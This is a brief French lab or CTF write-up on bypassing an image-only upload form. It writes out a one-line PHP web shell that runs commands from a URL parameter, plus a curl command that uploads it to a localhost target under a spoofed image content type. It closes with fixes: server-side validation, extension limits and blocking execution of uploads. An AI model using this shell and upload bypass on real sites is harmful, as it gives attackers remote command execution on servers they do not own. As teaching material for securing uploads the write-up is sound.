home/ add image

C'est une page pour upload un fichier mais cela n'accepte que les images.

1. On cree un fichier php pour executer des commandes 
echo '<?php system($_GET["cmd"]); ?>' > shell.php

2. On upload le fichier 

curl -s -H "Content-Type: multipart/form-data" \
  -F Upload=Upload \
  -F "uploaded=@shell.php;type=image/jpeg" \
  "http://localhost:8080/index.php?page=upload"

Ensuite il va cat automatiquement le contenu de la page


Comment éviter ? 

On doit valider dans le back les fichiers uploadés.
On peut aussi limiter les extensions.
On peut aussi interdire l'exécution des fichiers uploadés.

